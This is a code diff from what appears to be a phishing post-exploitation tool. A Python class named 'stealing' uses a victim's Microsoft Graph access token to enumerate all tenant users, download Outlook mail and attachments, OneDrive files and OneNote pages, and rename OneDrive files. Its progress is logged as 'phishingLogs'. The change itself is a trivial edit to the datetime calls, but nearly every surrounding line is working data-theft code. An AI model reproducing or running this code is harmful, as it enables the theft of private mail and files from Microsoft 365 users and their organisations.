@@ -129,14 +129,14 @@ class stealing():
     def victimprofile(uuid, accessToken):
         response = stealing.apiCall(uuid, "/me", 'GET', None, "", accessToken).json()
         profile = response['userPrincipalName']
-        log = f'<br><span style="color:yellow">[+] {datetime.datetime.now()} {profile} incoming!</span>'
+        log = f'<br><span style="color:yellow">[+] {datetime.now()} {profile} incoming!</span>'
         db.session.add(phishingLogs(uuid=uuid, message=log))
         db.session.commit()
 
     def listusers(uuid, accessToken, username):
         response = stealing.apiCall(uuid, "/users?$top=999", 'GET', None, "", accessToken)
         if response.status_code == 403:
-            log = ('<br><span style="color:yellow">[!] '+str(datetime.datetime.now())+' Victim\'s token doesn\'t have permission to list users!</span>')
+            log = ('<br><span style="color:yellow">[!] '+str(datetime.now())+' Victim\'s token doesn\'t have permission to list users!</span>')
             db.session.add(phishingLogs(uuid=uuid, message=log))
             db.session.commit()
             return
@@ -181,12 +181,12 @@ class stealing():
                     pass    
             except Exception as e:
                 print(e)
-                log = ('<span style="color:red">[-] '+str(datetime.datetime.now())+' listusers:'+str(e)+' </span>')
+                log = ('<span style="color:red">[-] '+str(datetime.now())+' listusers:'+str(e)+' </span>')
                 db.session.add(phishingLogs(uuid=uuid, message=log))
                 db.session.commit()
                 
         
-        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.datetime.now())+' All user\'s in tenant saved!</span>')
+        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+' All user\'s in tenant saved!</span>')
         db.session.add(phishingLogs(uuid=uuid, message=log))
         db.session.commit()
 
@@ -220,7 +220,7 @@ class stealing():
 
                 except Exception as e:
                     print(e) 
-                    log = ('<br><span style="color:red">[-] '+str(datetime.datetime.now())+' Attachments: '+str(e)+'</span>')
+                    log = ('<br><span style="color:red">[-] '+str(datetime.now())+' Attachments: '+str(e)+'</span>')
                     db.session.add(phishingLogs(uuid=uuid, message=log))
                     db.session.commit()
             try:
@@ -233,7 +233,7 @@ class stealing():
 
     def outlook(uuid, accessToken, victim, endpoint):
         response = stealing.apiCall(uuid, endpoint, "GET", None, "", accessToken).json()
-        log = ('<br><span style="color:yellow">[!] '+str(datetime.datetime.now())+' Retrieving Attachments!</span>')
+        log = ('<br><span style="color:yellow">[!] '+str(datetime.now())+' Retrieving Attachments!</span>')
         db.session.add(phishingLogs(uuid=uuid, message=log))
         db.session.query(Outlook).filter_by(uuid=uuid, username=victim).delete()
         db.session.query(Attachments).filter_by(uuid=uuid, receiver=victim).delete()
@@ -275,7 +275,7 @@ class stealing():
                 
             except Exception as e:
                 # LOGGING
-                log = ('<br><span style="color:red">[-] '+str(datetime.datetime.now())+' Outlook: '+str(e)+'</span>')
+                log = ('<br><span style="color:red">[-] '+str(datetime.now())+' Outlook: '+str(e)+'</span>')
                 db.session.add(phishingLogs(uuid=uuid, message=log))
                 
                 return
@@ -289,7 +289,7 @@ class stealing():
             endpoint = response["@odata.nextLink"].split("/v1.0")[1]
             stealing.outlook(uuid, accessToken, victim, endpoint)
 
-        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.datetime.now())+' Outlook Done</span>')    
+        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+' Outlook Done</span>')    
         db.session.add(phishingLogs(uuid=uuid, message=log))
         db.session.commit()
         
@@ -305,7 +305,7 @@ class stealing():
             extension = extension.replace(".", '')
 
             if extension in config.extension or config.extension == "*" or config.extension == "":
-                log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.datetime.now())+str(name)+'</span>')
+                log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+str(name)+'</span>')
                 db.session.add(phishingLogs(uuid=uuid, message=log))
                 
                 content = requests.get(url, allow_redirects=True).content
@@ -344,7 +344,7 @@ class stealing():
                             time.sleep(config.delay)
                             response = stealing.apiCall(uuid, "/me/drive/items/"+itemId, 'PATCH', "application/json", jsonBody, accessToken)    
                             if response.status_code != 200:
-                                log = ('<br><span style="color:red">[-] '+str(datetime.datetime.now())+' File not renamed!</span>') 
+                                log = ('<br><span style="color:red">[-] '+str(datetime.now())+' File not renamed!</span>') 
                                 db.session.add(phishingLogs(uuid=uuid, message=log))
                                 db.session.commit()
                                 return "File not renamed!"
@@ -362,7 +362,7 @@ class stealing():
         except Exception as e:
             if "list index out of range" in str(e) or "@microsoft.graph.downloadUrl" in str(e):
                 return
-            log = ('<br><span style="color:red">[-] '+str(datetime.datetime.now())+' OneDrive: '+str(e)+'</span>') 
+            log = ('<br><span style="color:red">[-] '+str(datetime.now())+' OneDrive: '+str(e)+'</span>') 
             db.session.add(phishingLogs(uuid=uuid, message=log))
             db.session.commit()
 
@@ -373,11 +373,11 @@ class stealing():
         try:
             response['value'][0]['id']
         except:
-            log = ('<br><span style="color:red">[!] '+str(datetime.datetime.now())+' OneDrive is Empty or accessToken has no rights on it!</span>') 
+            log = ('<br><span style="color:red">[!] '+str(datetime.now())+' OneDrive is Empty or accessToken has no rights on it!</span>') 
             db.session.add(phishingLogs(uuid=uuid, message=log))
             db.session.commit()
             return
-        log = ('<br><span style="color:yellow">[!] '+str(datetime.datetime.now())+' Retrieving OneDrive Files!</span>')
+        log = ('<br><span style="color:yellow">[!] '+str(datetime.now())+' Retrieving OneDrive Files!</span>')
         db.session.add(phishingLogs(uuid=uuid, message=log))
         db.session.query(OneDrive).filter_by(uuid=uuid, username=victim).delete()
         db.session.commit()
@@ -391,20 +391,20 @@ class stealing():
                 
                 try:
                     for item in response['value']:
-                        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.datetime.now())+item['name']+'</span>')
+                        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+item['name']+'</span>')
                         db.session.add(phishingLogs(uuid=uuid, message=log))
                         db.session.commit()
                         threading.Thread(target=stealing.downloadOndriveFiles, name="Service Principle", args=(uuid, item, config, victim, accessToken)).start()
 
                 except Exception as e:
-                    log = ('<br><span style="color:red">[-] '+str(datetime.datetime.now())+' OneDrive: '+str(e)+'</span>') 
+                    log = ('<br><span style="color:red">[-] '+str(datetime.now())+' OneDrive: '+str(e)+'</span>') 
                     db.session.add(phishingLogs(uuid=uuid, message=log))
                     db.session.commit()
                     
             
             threading.Thread(target=stealing.downloadOndriveFiles, name="Service Principle", args=(uuid, item, config, victim, accessToken)).start()
             
-        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.datetime.now())+' OneDrive: Done</span>') 
+        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+' OneDrive: Done</span>') 
         db.session.add(phishingLogs(uuid=uuid, message=log))
         db.session.commit()
 
@@ -412,7 +412,7 @@ class stealing():
         
         response = stealing.apiCall(uuid, "/me/onenote/pages/", "GET", None, "", accessToken)
         if response.status_code == 401:
-            log = ('<br><span style="color:red">[-] '+str(datetime.datetime.now())+' Access token doesn\'t have access for OneNote</span>')
+            log = ('<br><span style="color:red">[-] '+str(datetime.now())+' Access token doesn\'t have access for OneNote</span>')
             db.session.add(phishingLogs(uuid=uuid, message=log))
             db.session.commit()
             return
@@ -420,11 +420,11 @@ class stealing():
         try:
             response['value'][0]['contentUrl']
         except:
-            log = ('<br><span style="color:red">[-] '+str(datetime.datetime.now())+' OneNote is Empty or accessToken has no rights on it!</span>') 
+            log = ('<br><span style="color:red">[-] '+str(datetime.now())+' OneNote is Empty or accessToken has no rights on it!</span>') 
             db.session.add(phishingLogs(uuid=uuid, message=log))
             db.session.commit()
             return
-        log = ('<br><span style="color:yellow">[+] '+str(datetime.datetime.now())+' Retrieving OneNote Files! </span>')
+        log = ('<br><span style="color:yellow">[+] '+str(datetime.now())+' Retrieving OneNote Files! </span>')
         db.session.add(phishingLogs(uuid=uuid, message=log))
         db.session.query(OneNote).filter_by(uuid=uuid, username=victim).delete()
         db.session.commit()
@@ -448,7 +448,7 @@ class stealing():
                     db.session.rollback()
                     #print("OneDrive " + str(e))
 
-                log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.datetime.now())+filename+' Downloaded!</span>')
+                log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+filename+' Downloaded!</span>')
                 db.session.add(phishingLogs(uuid=uuid, message=log))
                 db.session.commit()
 
@@ -458,11 +458,11 @@ class stealing():
                 print(exc_type, fname, exc_tb.tb_lineno)
                 if "list index out of range" in str(e):
                     break
-                log = ('<br><span style="color:red">[-] '+str(datetime.datetime.now())+' OneNote: '+str(e)+'</span>') 
+                log = ('<br><span style="color:red">[-] '+str(datetime.now())+' OneNote: '+str(e)+'</span>') 
                 db.session.add(phishingLogs(uuid=uuid, message=log))
                 db.session.commit()
 
-        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.datetime.now())+' OneNote Done</span>')
+        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+' OneNote Done</span>')
         db.session.add(phishingLogs(uuid=uuid, message=log))
         db.session.commit()
 
